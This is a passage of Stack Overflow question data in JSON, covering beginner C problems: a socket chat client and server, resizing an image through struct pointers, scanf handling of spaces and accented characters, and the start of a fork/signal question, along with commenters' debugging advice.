debugger."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482876250, "post_id": 41352368, "comment_id": 69907388, "body": "<code>scanf(&quot;%[^\\n]%*c&quot;, message);</code> --&gt; If the first character read is a <code>&#39;\\n&#39;</code>, nothing changes, <code>message</code> left as before.  <code>&#39;\\n&#39;</code> remains for the next <code>scanf()</code>."}, {"owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1548680032, "post_id": 41352368, "comment_id": 95615309, "body": "<code>server.c:8:19: error: split.h: No such file or directory</code>"}], "owner": {"reputation": 1154, "user_id": 5511084, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/ypNzt.jpg?s=128&g=1", "display_name": "Berkin Akayd\u0131n", "link": "https://stackoverflow.com/users/5511084/berkin-akayd%c4%b1n"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 634, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1482876246, "creation_date": 1482873716, "last_edit_date": 1482873999, "question_id": 41352368, "link": "https://stackoverflow.com/questions/41352368/socket-programming-send-recv-before-scanf", "title": "Socket Programming Send / Recv Before Scanf", "body": "<p>Im trying to create connection between 2 clients via a server. In this program, client sends a message to the server and server post it to the target client. But there is a little problem between this operation. Transmitter one cannot send another message before it receive some message or receiver one cannot see the received message before send a message. Video should explain better.</p>\n\n<blockquote>\n  <p>You can find scanf function in below of client.c codes</p>\n</blockquote>\n\n<h1>CLIENT</h1>\n\n<pre><code>//\n// Created by berkin on 18.12.2016.\n//\n\n#include&lt;stdio.h&gt;\n#include&lt;sys/socket.h&gt;\n#include&lt;arpa/inet.h&gt; // for inet_addr\n#include &lt;string.h&gt;\n#include &lt;zconf.h&gt;\n\nint main(int argc, char *argv[]) {\n    int  sock;\n    struct sockaddr_in server;\n    char message[2000], server_reply[2000];\n\n    //Create socket\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock == -1) {\n        printf(\"Could not create socket\");\n    }\n\n    server.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    server.sin_family      = AF_INET;\n    server.sin_port        = htons(8888);\n\n    //Connect to remote server\n    if (connect(sock, (struct sockaddr *) &amp;server, sizeof(server)) &lt; 0) {\n        perror(\"Connect failed. Error\");\n        return 1;\n    }\n\n    puts(\"Connected to server\\n\");\n\n\n    //keep communicating with server\n    while (1) {\n        printf(\"&gt; \");\n        scanf(\"%[^\\n]%*c\", message);\n        fflush(stdin);\n\n        //Send some data\n        if (send(sock, message, strlen(message)+1, 0) &lt; 0) {\n            puts(\"Send failed\");\n            return 1;\n        }\n\n\n        if (recv(sock, server_reply, 2000, 0) &lt; 0) {\n            puts(\"recv failed\");\n            break;\n        }\n\n        //Receive a reply from the server\n\n        printf (\"\\033[32;1m %s \\033[0m\\n\",server_reply);\n    }\n\n    close(sock);\n    return 0;\n}\n</code></pre>\n\n<h1>SERVER</h1>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;    // for strlen\n#include&lt;stdlib.h&gt;\n#include&lt;sys/socket.h&gt;\n#include&lt;arpa/inet.h&gt; // for inet_addr\n#include&lt;unistd.h&gt;    // for write\n#include&lt;pthread.h&gt;   // for threading, link with lpthread\n#include \"split.h\"\n\n#define MAX_CLIENT_NUMBER 100\n\nvoid *connection_handler(void *);\n\nstruct User {\n    char userName[10];\n    int  clientSocketNo;\n};\n\nunsigned int clientNumber = 0;\nunsigned int userArrayIndex = 0;\nstruct User users[MAX_CLIENT_NUMBER];\n\n//FOR GETUSERS COMMAND\nvoid getUsers(int socketNumber) {\n    char *userString = malloc(100);\n    if (users[0].userName != NULL) {\n        strcpy(userString, users[0].userName);\n        strcat(userString, \",\");\n    } else {\n        return;\n    }\n\n    for (int i = 1; i &lt; userArrayIndex; ++i) {\n        strcat(userString, users[i].userName);\n        strcat(userString, \",\");\n    }\n    write(socketNumber, userString, strlen(userString) + 1);\n}\n\n//AFTER LOGIN COMMAND, ADD TO THE ARRAY\nvoid addUserToArray(char userName[10], int socketNumber) {\n    printf(\"Client logged in as %s\\n\", userName);\n    strcpy(users[userArrayIndex].userName, userName);\n    users[userArrayIndex].clientSocketNo = socketNumber;\n    userArrayIndex++;\n}\n\n//LOGIN COMMAND\nvoid loginUser(char userName[10], int socketNumber) {\n    char *message = \"login successful\";\n    write(socketNumber, message, strlen(message) + 1);\n    addUserToArray(userName, socketNumber);\n}\n\n//SEND MESSAGE IF USER FOUND\nvoid sendMessage(struct User user, char *message){\n    write(user.clientSocketNo,message,strlen(message) + 1);\n}\n\n//SEARCH USER FROM ARRAY\nstruct User searchUser(char searchName[10]){\n    for (int i = 0; i &lt; userArrayIndex; ++i) {\n        if(strcmp(users[i].userName,searchName) == 0){\n            return users[i];\n        }\n    }\n}\n\nvoid *connection_handler(void *socket_desc) {\n    //Get the socket descriptor\n    char receivedMessage[2000];  //client's message\n\n    int readControl;\n    int parsedItemNumber = 0;\n    int sock = *((int *) socket_desc);\n\n    while ((readControl = recv(sock, receivedMessage, 2000, 0)) &gt; 0) {\n        char *parsedCommand[50]; //parsedClientMessage\n\n        parsedItemNumber = parsing(parsedCommand, receivedMessage, \" \");\n\n        if (strcmp(parsedCommand[0], \"login\") == 0) {\n            loginUser(parsedCommand[1], sock);\n        }\n\n        else if (strcmp(parsedCommand[0], \"getusers\") == 0) {\n            getUsers(sock);\n        }\n\n        else if (strcmp(parsedCommand[0], \"exit\") == 0) {\n            close(sock);\n            return 0;\n        }\n        else{\n            if(parsedCommand[0] != NULL){\n                struct User find = searchUser(parsedCommand[0]);\n                if(find.userName != NULL){\n                    char *message = malloc(2000);\n                    if(parsedCommand[1] != NULL){\n                        strcpy(message,parsedCommand[1]);\n                        strcat(message,\" \");\n                    }\n                    for (int i = 2; i &lt; parsedItemNumber; ++i) {\n                        strcat(message,parsedCommand[i]);\n                        strcat(message,\" \");\n                    }\n\n                    sendMessage(find,message);\n                }\n                else{\n                    perror(\"Your input was wrong\");\n                }\n            }\n        }\n    }\n\n    if (readControl == 0) {\n        puts(\"Client disconnected\");\n        clientNumber--;\n        fflush(stdout);\n    } else if (readControl == -1) {\n        perror(\"recv failed\");\n    }\n\n    //Free the socket pointer\n    free(socket_desc);\n    return 0;\n}\n\nint main(int argc, char *argv[]) {\n\n    int                socket_desc, new_socket, c, *new_sock;\n    struct sockaddr_in server, client;\n\n    //Create Socket\n    socket_desc = socket(AF_INET, SOCK_STREAM, 0);\n    if (socket_desc == -1) {\n        puts(\"Could not create socket\");\n        return 1;\n    }\n\n    server.sin_family      = AF_INET;\n    server.sin_addr.s_addr = INADDR_ANY;\n    server.sin_port        = htons(8888);\n\n    if (bind(socket_desc, (struct sockaddr *) &amp;server, sizeof(server)) &lt; 0) {\n        puts(\"Binding failed\");\n        return 1;\n    }\n\n    listen(socket_desc, 3);\n\n    puts(\"Server started\");\n    c                  = sizeof(struct sockaddr_in);\n    while ((new_socket = accept(socket_desc, (struct sockaddr *) &amp;client, (socklen_t *) &amp;c)) &amp;&amp;\n           clientNumber &lt; MAX_CLIENT_NUMBER) {\n        pthread_t sniffer_thread[MAX_CLIENT_NUMBER];\n        new_sock = malloc(1);\n        *new_sock = new_socket;\n\n        if (pthread_create(&amp;sniffer_thread[clientNumber], NULL, connection_handler,\n                           (void *) new_sock) &lt; 0) {\n            perror(\"Could not create thread\");\n            return 1;\n        } else {\n            clientNumber++;\n        }\n\n        puts(\"Client connected\");\n    }\n\n\n    if (new_socket &lt; 0) {\n        perror(\"accept failed\");\n        return 1;\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "function", "pointers", "struct", "pixels"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1482872943, "post_id": 41352229, "comment_id": 69906263, "body": "<code>*foo-&gt;bar</code> parses as <code>*(foo-&gt;bar)</code>."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482873050, "post_id": 41352229, "comment_id": 69906314, "body": "The <code>-&gt;</code> is shortcut for <code>(*).</code> In your case <code>*plain-&gt;height</code> means <code>*(*plain).height</code> and that is one <code>*</code> too much. Just do <code>plain-&gt;height</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482873243, "post_id": 41352229, "comment_id": 69906370, "body": "&quot;given two functions, one that can load an image and other that can save the image, so we don&#39;t need to worry about that&quot; --&gt;  Hmmm.  Try saving to a _different file.  <code>writeImage(&quot;test.png2&quot;, &amp;plain);</code>"}, {"owner": {"reputation": 6013, "user_id": 3310281, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9b8b4ec03e2c7a424fdc428eb55f2e8?s=128&d=identicon&r=PG&f=1", "display_name": "Malcolm McLean", "link": "https://stackoverflow.com/users/3310281/malcolm-mclean"}, "edited": false, "score": 0, "creation_date": 1482873327, "post_id": 41352229, "comment_id": 69906398, "body": "I maintain my simple image processing functions here <a href=\"https://github.com/MalcolmMcLean/babyxrc\" rel=\"nofollow noreferrer\">github.com/MalcolmMcLean/babyxrc</a> resizing can be done in lots of different ways. Easiest is to simply duplicate pixels to size by a power of two, but that gives very pixelly results."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482873551, "post_id": 41352229, "comment_id": 69906495, "body": "<code>Image plain; makeBigger(plain);</code> and <code>void makeBigger(Image* plain)</code> do not work togather.  Compiler should have caught that.  Post <code>&quot;studentFunctions.h&quot;</code>.  I&#39;d expect <code>makeBigger(&amp;plain);</code>  (add &amp;)"}, {"owner": {"reputation": 23, "user_id": 7346859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/daa94e9fe25a9b2c8ad2fb1989458385?s=128&d=identicon&r=PG&f=1", "display_name": "zaylan", "link": "https://stackoverflow.com/users/7346859/zaylan"}, "edited": false, "score": 0, "creation_date": 1482874853, "post_id": 41352229, "comment_id": 69906958, "body": "Thanks all, after changing to plain-&gt;height as well as makeBigger(&amp;plain); I&#39;m still getting an error right when the image is saving, which is &quot;Exception thrown: read access violation. pixel was 0xEEEFFE.&quot;  I thought maybe Image plain; should instead be Image* plain; but that gives the same error but with the address 0xB0EFFE. I&#39;m gonna add the header file as well."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482875360, "post_id": 41352229, "comment_id": 69907104, "body": "Still saving to the same file <code>&quot;test.png&quot;</code>?.  Try just reading and writing the file.  No <code>invertColor();         switchColor();         makeBigger();</code>"}, {"owner": {"reputation": 13815, "user_id": 6575931, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-CumJFhlEBdA/AAAAAAAAAAI/AAAAAAAAi5U/sqexnazvXek/photo.jpg?sz=128", "display_name": "Uriel", "link": "https://stackoverflow.com/users/6575931/uriel"}, "edited": false, "score": 0, "creation_date": 1482875470, "post_id": 41352229, "comment_id": 69907149, "body": "<code>plain</code> is a struct, yet you sometimes pass it as pointer. You should pass it <b>always</b> as a pointer, and make it a pointer. Otherwise it will not be changed upon leaving the functions. If you want to access the width as pointer just access <code>plain-&gt;width</code>."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "reply_to_user": {"reputation": 13815, "user_id": 6575931, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-CumJFhlEBdA/AAAAAAAAAAI/AAAAAAAAi5U/sqexnazvXek/photo.jpg?sz=128", "display_name": "Uriel", "link": "https://stackoverflow.com/users/6575931/uriel"}, "edited": false, "score": 1, "creation_date": 1482875970, "post_id": 41352229, "comment_id": 69907296, "body": "@UrielEli while I concur with the semantics of what you&#39;re describing, the OP&#39;s entrypoint for inverting color can be passed by value. The only thing that code does is change <i>dereferenced</i> data from the <code>pixels</code> member (a pointer), still leads to the same data, whether <code>plain</code> is passed by value or not. The <code>makeBigger</code> function modifies the value members of <code>Image</code>, and thusly is passed by address. While odd looking, this interface for <code>invertColor</code> and <code>switchColor</code> should work. That said, <code>makeBigger</code> is broken in multiple ways: wrong dereferencing, and no resizing of <code>pixels</code>."}, {"owner": {"reputation": 23, "user_id": 7346859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/daa94e9fe25a9b2c8ad2fb1989458385?s=128&d=identicon&r=PG&f=1", "display_name": "zaylan", "link": "https://stackoverflow.com/users/7346859/zaylan"}, "edited": false, "score": 0, "creation_date": 1482877147, "post_id": 41352229, "comment_id": 69907676, "body": "Changing plain to a pointer (if changing &quot;Image plain;&quot; to &quot;Image* plain;&quot; changes it to a pointer) still gives me access violation, on &quot;0xD7EFFE&quot;. And yes I now save it as a new one &quot;test2.png&quot;. Invert colors and switch colors work, though now it says &quot; Stack around the variable &#39;plain&#39; was corrupted.&quot; but they still work, as the new images colors is inverted."}, {"owner": {"reputation": 23, "user_id": 7346859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/daa94e9fe25a9b2c8ad2fb1989458385?s=128&d=identicon&r=PG&f=1", "display_name": "zaylan", "link": "https://stackoverflow.com/users/7346859/zaylan"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1482877410, "post_id": 41352229, "comment_id": 69907758, "body": "@WhozCraig I haven&#39;t yet gotten to resizing pixels as I try to figure out how to higher the resolution of the image to be able to size the pixels, that&#39;s how thought of doing it anyways."}], "answers": [{"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 0, "last_activity_date": 1548682208, "creation_date": 1548682208, "answer_id": 54403088, "question_id": 41352229, "link": "https://stackoverflow.com/questions/41352229/changing-an-images-size-resolution-using-struct-and-pointers-in-c/54403088#54403088", "title": "Changing an images size/resolution using struct and pointers in C", "body": "<blockquote>\n<pre><code>void makeBigger(Image* plain)\n{\n    *plain-&gt;height *= 2;\n    *plain-&gt;width *= 2;\n\n}\n</code></pre>\n  \n  <p>I haven't yet gotten to resizing pixels as I try to figure out how to higher the resolution of the image to be able to size the pixels, that's how thought of doing it anyways.</p>\n</blockquote>\n\n<p>In order <em>to higher the resolution of the image</em>, i.&nbsp;e. to enlarge it, it is not sufficient to make <code>plain-&gt;height</code> and <code>plain-&gt;width</code> (without the <code>*</code> before) bigger, rather it is also necessary to increase the allocated memory for the pixel row and column arrays - unless they'd already have been overallocated by <code>readImage()</code>, but the <em>read access violation</em> indicates they haven't. Yet we can't reliably determine how to reallocate the pixel memory whilst we don't know how the arrays have been originally allocated, so the given task is impossible to do with only the given information - a regrettable mistake of your teacher.</p>\n"}], "owner": {"reputation": 23, "user_id": 7346859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/daa94e9fe25a9b2c8ad2fb1989458385?s=128&d=identicon&r=PG&f=1", "display_name": "zaylan", "link": "https://stackoverflow.com/users/7346859/zaylan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 722, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1548682208, "creation_date": 1482872759, "last_edit_date": 1482875082, "question_id": 41352229, "link": "https://stackoverflow.com/questions/41352229/changing-an-images-size-resolution-using-struct-and-pointers-in-c", "title": "Changing an images size/resolution using struct and pointers in C", "body": "<p>we have been giving a task to complete at our school where we need to alter an image (invert colors, switch colors, rotate it by 90 degrees, double the size, zoom in on it) and right now I'm trying to double its size by doubling it's resolution but can't figure out how to access that address and change it.\nWe've been given two functions, one that can load an image and other that can save the image, so we don't need to worry about that, we've also been given two structs, one with rgb values and one with height and width(in pixels).</p>\n\n<p>I've been looking around but haven't really found anything that works, or I'm just doing it wrong. I've also tried multiple things without success.</p>\n\n<p>Here is my main.c :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include \"studentFunctions.h\"\n\nint main()\n{\n    Image plain;\n    char selection;\n    readImage(\"test.png\", &amp;plain);\n\n    printf(\"What do you wish to do?\\nInvert colors = i.\\nSwitch colors = s.\\nDoulbe size = d.\");\n    scanf(\"%c\", &amp;selection);\n\n    switch (selection)\n    {\n\n    case 'i':\n        invertColor(plain);\n        break;\n\n    case 's':\n        switchColor(plain);\n        break;\n\n    case 'd':\n        makeBigger(plain);\n        break;\n    }\n\n    printf(\"Saving PNG\\n\");\n    writeImage(\"test.png\", &amp;plain);\n\n    return 0;\n    }\n</code></pre>\n\n<p>here is my function.c :</p>\n\n<pre><code>#include \"studentFunctions.h\"\n\n\nvoid invertColor(Image plain)\n{\n    for (unsigned int i = 0; i &lt; plain.height; i++)\n    {\n        for (unsigned int j = 0; j &lt; plain.width; j++)\n        {\n            plain.pixels[i][j].r = 255 - (plain.pixels[i][j].r);\n            plain.pixels[i][j].g = 255 - (plain.pixels[i][j].g);\n            plain.pixels[i][j].b = 255 - (plain.pixels[i][j].b);\n        }\n    }\n}\n\nvoid switchColor(Image plain)\n{\n    int temp;\n\n    for (unsigned int i = 0; i &lt; plain.height; i++)\n    {\n        for (unsigned int j = 0; j &lt; plain.width; j++)\n        {\n            temp = plain.pixels[i][j].r;\n\n            plain.pixels[i][j].r = plain.pixels[i][j].b;\n            plain.pixels[i][j].b = plain.pixels[i][j].g;\n            plain.pixels[i][j].g = temp;\n        }\n    }\n}\n\nvoid makeBigger(Image* plain)\n{\n    *plain-&gt;height *= 2;\n    *plain-&gt;width *= 2;\n\n}\n</code></pre>\n\n<p>as you see I tried to point at the plain.height and plain.width to change the image resolution but this doesn't work. When hovering over \"plain\" it says \"operand of '*' must be a pointer\". What does this actually mean, and what is the correct way to do this?</p>\n\n<p>The two functions we were giving looks like this:</p>\n\n<pre><code>void writeImage(char* filename, Image *img);\n</code></pre>\n\n<p>and</p>\n\n<pre><code>void readImage(char *filename, Image *img);\n</code></pre>\n\n<p>and the two structs we were giving are: </p>\n\n<pre><code>typedef struct image {\nPixel **pixels;\nunsigned int height;\nunsigned int width;\n} Image;\n</code></pre>\n\n<p>and</p>\n\n<pre><code>typedef struct pixel {\nuint8_t r;\nuint8_t g;\nuint8_t b;\n} Pixel;\n</code></pre>\n\n<p>We can't edit or see the two given function nor the two structs.</p>\n\n<p>Preferable I'd like an explanation of this and maybe a simple example, rather than a straight answer, as I am trying to learn and understand this. As last note I'm new to programming in general and especially in C, hope it's clear enough.\nThanks for answer.</p>\n\n<p>Edit:\nHere is my header file:</p>\n\n<pre><code>#ifndef STUDENTFUNCTIONS_H\n#define STUDENTFUNCTIONS_H\n\n#include &lt;functions.h&gt;\n\nvoid invertColor(Image plain);\nvoid switchColor(Image plain);\nvoid makeBigger(Image* plain);\n\n#endif\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1482872804, "post_id": 41352195, "comment_id": 69906205, "body": "when asking a rumtime question:  post a short code that cleanly compiles and shows the problem  post the actual input.  post the actual output, post the expected output."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1482872906, "post_id": 41352195, "comment_id": 69906248, "body": "&quot; I put the teams like Madrid - Bar&#231;a and then in File only appears Madrid&quot; --&gt; <code>scanf(&quot;%s&quot;, futebol[camp].campeoes);</code> , does not save spaces in <code>futebol[camp].campeoes</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1482872970, "post_id": 41352195, "comment_id": 69906273, "body": "&quot;... the file don&#39;t recognize &#39;&#231;&#39;.&quot; --&gt; How did you determine this - what did you see?  What tool was used to read the file?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482873442, "post_id": 41352195, "comment_id": 69906450, "body": "I clipboard copied your text <code>Bar&#231;a</code> and pasted that as console input to a simple <code>scanf(&quot;%s&quot;, str)</code> program and the output was: <code>Bar&#231;a</code>."}, {"owner": {"reputation": 4046, "user_id": 4971422, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4abf51a937ddda51cc6813445605c50?s=128&d=identicon&r=PG&f=1", "display_name": "FredK", "link": "https://stackoverflow.com/users/4971422/fredk"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1482874072, "post_id": 41352195, "comment_id": 69906679, "body": "To expand on what @chux said, when using the %s format descriptor, scanf() will read the first space-delimited set of characters input, so it will quit reading upon encountering the space following the 5 characters &quot;Bar&#231;a&quot;/"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 4046, "user_id": 4971422, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4abf51a937ddda51cc6813445605c50?s=128&d=identicon&r=PG&f=1", "display_name": "FredK", "link": "https://stackoverflow.com/users/4971422/fredk"}, "edited": false, "score": 1, "creation_date": 1482874337, "post_id": 41352195, "comment_id": 69906766, "body": "@FredK but, the question says: &quot;if I put only Bar&#231;a, the file don&#39;t recognize &#39;&#231;&#39;.&quot;"}, {"owner": {"reputation": 11, "user_id": 7318115, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b19ba3d96ff5d9ee281e69a4695fb40?s=128&d=identicon&r=PG&f=1", "display_name": "ricascross", "link": "https://stackoverflow.com/users/7318115/ricascross"}, "edited": false, "score": 0, "creation_date": 1482874926, "post_id": 41352195, "comment_id": 69906975, "body": "So, what I have to change? And How will I change?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482875510, "post_id": 41352195, "comment_id": 69907158, "body": "&quot;what I have to change? &quot; --&gt; Responding to <a href=\"http://stackoverflow.com/questions/41352195/i-have-some-troubles-with-my-code#comment69906273_41352195\">questions</a> asked is a good first step."}, {"owner": {"reputation": 11, "user_id": 7318115, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b19ba3d96ff5d9ee281e69a4695fb40?s=128&d=identicon&r=PG&f=1", "display_name": "ricascross", "link": "https://stackoverflow.com/users/7318115/ricascross"}, "edited": false, "score": 0, "creation_date": 1482879056, "post_id": 41352195, "comment_id": 69908256, "body": "the tool is  int x;  feventosDesportivosFutebol = fopen   (&quot;EventosDesportivosFutebol.txt&quot;,&quot;r&quot;);  if (feventosDesportivosFutebol == NULL){         printf(&quot;Error!&quot;);  } else {       while ((x = fgetc(feventosDesportivosFutebol)) != EOF)  \t\t\t\t{  \t\t\t\t\tprintf(&quot;%c&quot;, x);  \t\t\t\t\t \t\t\t\t}  \t\t\t\tfclose(feventosDesportivosFutebol);  \t\t\t\tgetchar();  \t\t\t\tprintf(&quot;\\n\\n\\n\\n\\n&quot;); }"}], "owner": {"reputation": 11, "user_id": 7318115, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b19ba3d96ff5d9ee281e69a4695fb40?s=128&d=identicon&r=PG&f=1", "display_name": "ricascross", "link": "https://stackoverflow.com/users/7318115/ricascross"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 99, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1510225020, "creation_date": 1482872542, "last_edit_date": 1482872709, "question_id": 41352195, "link": "https://stackoverflow.com/questions/41352195/i-have-some-troubles-with-my-code", "title": "I have some troubles with my code", "body": "<p>I'm having some troubles with my code. I'm running the code I put the teams like Madrid - Bar\u00e7a and then in File only appears Madrid. Otherwise if I put only Bar\u00e7a, the file don't recognize '\u00e7'.</p>\n\n<pre><code>while (camp&lt;5) {\n  printf(\"Altere Jogos da Liga dos Campe\u00f5es %d: \", camp+1);\n  scanf(\"%s\", futebol[camp].campeoes);\n  while (getchar() != '\\n');\n  camp++;\n}\n\nfeventosDesportivosFutebol = fopen(\"EventosDesportivosFutebol.txt\", \"w\");\nif (feventosDesportivosFutebol != NULL) {\n  fprintf(feventosDesportivosFutebol, \"\\n\\nLiga dos Campe\u00f5es:\\n\\n\");\n  for (camp = 0; camp&lt;5; camp++) {\n    fprintf(feventosDesportivosFutebol, \"%s\\n\", futebol[camp].campeoes);\n  }\n}\nfclose( feventosDesportivosFutebol);\n</code></pre>\n\n<p>Someone can help me?</p>\n"}, {"tags": ["c", "signals"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "icarus"}, "edited": false, "score": 0, "creation_date": 1482870349, "post_id": 41377023, "comment_id": 69955783, "body": "For question 1 you are on the right lines. Consider what happens if the <code>else</code> part (the parent) runs immediately after the <code>fork()</code>, before say even the first <code>sigemptyset()</code> in the child."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1482873102, "post_id": 41377023, "comment_id": 69955784, "body": "amongst other problems with the posted code:  the function: <code>fork()</code> actually has 3 returns, not just 2.  &lt;= when an error occurs, ==0 when the child process,  &gt;0 when the parent process."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1482873219, "post_id": 41377023, "comment_id": 69955785, "body": "it is a poor programming practice for the child process to be executing any of the parent process code.  I.E. at the end of the child process should be a statement similar to: <code>exit(EXIT_SUCCESS);</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1482873373, "post_id": 41377023, "comment_id": 69955786, "body": "in the current scenario, the parent process should not be in a &#39;hurry&#39; to start passing signals to the child process until after the child lets the parent know that it is ready to handle the signals.  Such notification is missing from the posted code."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1482873497, "post_id": 41377023, "comment_id": 69955787, "body": "with the current posted code, the <code>sighandler()</code> function is missing the statement: <code>(void)signo;</code> so cannot cleanly compile"}], "migrated_from": {"other_site": {"aliases": ["http://linux.stackexchange.com"], "markdown_extensions": ["Prettify"], "launch_date": 1294871917, "open_beta_date": 